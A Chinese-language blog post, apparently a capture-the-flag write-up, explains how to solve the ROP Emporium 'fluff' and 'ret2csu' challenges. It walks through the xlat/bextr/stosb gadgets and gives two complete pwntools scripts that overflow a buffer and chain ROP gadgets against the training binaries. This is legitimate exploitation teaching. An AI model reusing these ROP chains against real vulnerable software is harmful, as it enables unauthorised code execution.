@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>rop emporium之再看fluff与ret2csu | BW-jitang</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://jitang-BW.github.io/favicon.ico?v=1706626864717">
+<link rel="stylesheet" href="https://jitang-BW.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="xlat 指令可以将寄存器的值作为地址，并将其指向的存储单元中的数据加载到 al 寄存器的低 8 位中；
+bextr 指令可以从一个源操作数中提取位块，并将其放置在目标操作数的最低有效位；
+stosb 指令可以将 al 寄存器的值写入 rd..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://jitang-BW.github.io">
+        <img src="https://jitang-BW.github.io/images/avatar.png?v=1706626864717" class="site-logo">
+        <h1 class="site-title">BW-jitang</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      温故而知新
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://jitang-BW.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">rop emporium之再看fluff与ret2csu</h2>
+            <div class="post-date">2024-01-21</div>
+            
+            <div class="post-content" v-pre>
+              <p>xlat 指令可以将寄存器的值作为地址，并将其指向的存储单元中的数据加载到 al 寄存器的低 8 位中；<br>
+bextr 指令可以从一个源操作数中提取位块，并将其放置在目标操作数的最低有效位；<br>
+stosb 指令可以将 al 寄存器的值写入 rdi 寄存器所指向的地址中。</p>
+<p>pop rdx; pop rcx; add rcx,rdx; bextr rbx,rcx,rdx: 用于将 flag.txt 写入内存，并用 bextr 指令进行位操作;<br>
+xlat byte ptr [rax]: 将 al 寄存器当前的值（第一遍时值为零）作为地址；<br>
+mov byte ptr [rdi], al: 将 al 寄存器的值写入 rdi 寄存器所指向的地址中。</p>
+<h2 id="所以构造步骤应该是">所以构造步骤应该是：</h2>
+<p>首先是填充缓冲区，并且构造一个从 pop_rdi_gadget 之后开始的过程的调用，将项“flag.txt”写入内存。</p>
+<p>然后是对每个字符执行位操作，将结果存储在输出缓冲区中（每个字节都有自己的用于存储的地址，可以在代码中看到）。</p>
+<p>使用print_file的地址以及 .bss 段中 flag.txt 字符串的地址来调用函数。</p>
+<h2 id="exp">exp</h2>
+<pre><code>from pwn import *
+from string import *
+context(log_level='debug',os='linux',arch='amd64',terminal=['tmux','splitw','-h'])
+
+io=process(&quot;./fluff&quot;)
+
+flag_addr=[0x4003C4,0x4003C5,0x4003D6,0X4003CF,0x4003FD,0x4003D8,0x400246,0x4003D8] #flag.txt
+flag=b&quot;flag.txt&quot;
+pop_rdi_ret=0x4006a3
+xlat_addr=0x400628  #mov al,[al+rbx]   
+pop_rdx_pop_rcx_add_rcx_bextr_addr=0x40062A  #mov rbx,rcx,rdx
+stosb_addr=0x400639  #mov [rdi],al #就是通过stosb指令实现al寄存器转到rdi上
+func_addr=0x400510
+bss_addr=0x601038
+payload=cyclic(0x28)
+for i in range(0,8):
+    payload+=p64(pop_rdx_pop_rcx_add_rcx_bextr_addr)
+    payload+=p64(0x2000)  #32bit对应16进制是0x20，截取的是整数倍也可以，比如0x4000,0x10000
+    if i==0:
+        payload+=p64(flag_addr[i]-0x3EF2-0xb)  #第一次操作要把调用的东西减掉 
+                                                #0x3ef2为调整偏移
+    else:
+        payload+=p64(flag_addr[i]-0x3EF2-int(flag[i-1]))
+    payload+=p64(xlat_addr) 
+    payload+=p64(pop_rdi_ret)
+    payload+=p64(bss_addr+i)
+    payload+=p64(stosb_addr)
+
+payload+=p64(pop_rdi_ret)+p64(bss_addr)+p64(func_addr)
+
+#gdb.attach(io)
+#pause()
+
+io.sendline(payload)
+io.interactive()
+</code></pre>
+<h1 id="ret2csu">ret2csu</h1>
+<p>再看这道题就是类似于模板的ret2csu</p>
+<p>满足a1 == 0xDEADBEEFDEADBEEFLL &amp;&amp; a2 == 0xCAFEBABECAFEBABELL &amp;&amp; a3 == 0xD00DF00DD00DF00DLL即可输出flag.txt</p>
+<p>找到空的第四个寄存器，通过一加一减实现了转化</p>
+<figure data-type="image" tabindex="1"><img src="https://jitang-BW.github.io/post-images/1697738478278.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://jitang-BW.github.io/post-images/1697738550347.png" alt="" loading="lazy"></figure>
+<p>理解如下：定义了常量 dereferenceable_addr，表示一个可以进行间接寻址的地址，以及 ret2win，表示要调用的函数 ret2win 的 plt 地址</p>
+<p>构造了一个名为 rop_chain 的字符串，其中包含了第一部分 ROP 链和第二部分 ROP 链。第一部分 ROP 链利用 ret2csu 技术调用函数，将需要的参数传递给函数并调用它。具体步骤为：</p>
+<p>将需要的参数存入寄存器 rax、rdi、rsi 和 rdx 中；<br>
+调用 ret2csu gadget，在函数执行前将这些参数依次存入栈中，并通过调用函数地址实现对函数的调用；<br>
+调用 ret2csu gadget 时，需要将其本身作为第一个参数传入（即将 RBX 设为 0）。<br>
+第二部分 ROP 链则是调用 ret2win 函数，将必要的参数传递给它并进行调用。具体步骤为：</p>
+<p>使用 pop_rdi_ret gadget 将 0xdeadbeefdeadbeef 地址存入 RDI 中；<br>
+调用 ret2win 函数</p>
+<pre><code>from pwn import *
+ 
+context.arch = 'amd64'
+context.log_level = 'debug'
+ 
+PROCESS = './ret2csu'
+io = process(PROCESS)
+ 
+pop_rdi_ret = p64(0x004006a3)                       # pop rdi; ret;
+ 
+ret2csu_gadget_staging = p64(0x0040069a)            # pop rbx;
+ 
+ret2csu_gadget_call_offset = p64(0x00400680)        # mov rdx, r15; 
+ 
+dereferenceable_addr = p64(0x00600e48)
+ret2win = p64(io.elf.plt['ret2win'])
+ 
+'''
+R15 = RDX = 0xd00df00dd00df00d
+R14 = RSI = 0xcafebabecafebabe
+R13 = RDI = 0xdeadbeefdeadbeef
+R12 = 0x00600e48
+RBX = 0x0
+'''
+rop_chain = b&quot;&quot;.join([
+    ret2csu_gadget_staging,
+    p64(0),                     # RBX = 0
+    p64(0x01),                  # RBP = 0x01; 
+    dereferenceable_addr,       # R12 = pointer to a safe address to dereference
+    p64(0xdeadbeefdeadbeef),    # R13 = RDI = 0xdeadbeefdeadbeef
+    p64(0xcafebabecafebabe),    # R14 = RSI = 0xcafebabecafebabe
+    p64(0xd00df00dd00df00d),    # R15 = RDX = 0xd00df00dd00df00d
+    ret2csu_gadget_call_offset, # 调用解引用地址的值
+ 
+    p64(0),                     # 对齐堆栈，值弹出后能再一次进行操作
+    p64(0),        #6个再调用             
+    p64(0),                     
+    p64(0),                     
+    p64(0),                     
+    p64(0),                     
+    p64(0),                     
+ 
+    pop_rdi_ret,                # 将 RDI 再次调整成为 0xdeadbeefdeadbeef
+    p64(0xdeadbeefdeadbeef),
+    ret2win                    
+])
+ 
+offset = 40
+padding = b&quot;A&quot; * offset
+payload = b&quot;&quot;.join([
+    padding,
+    rop_chain
+])
+ 
+io.sendline(payload)
+io.interactive()
+
+</code></pre>
+<p>几个p64(0)的作用是：目的是为了对齐栈。ret2csu gadget 需要通过 pop 指令从栈上连续弹出六个值，分别存入寄存器 rbx、rbp、r12、r13、r14 和 r15 中。由于栈的字节对齐要求，因此这些值必须依次按照 8 字节对齐存放在栈上。</p>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://jitang-BW.github.io/post/M3RmIrmse/">
+                  <h3 class="post-title">
+                    科协第五次培训
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+
+  </body>
+</html>
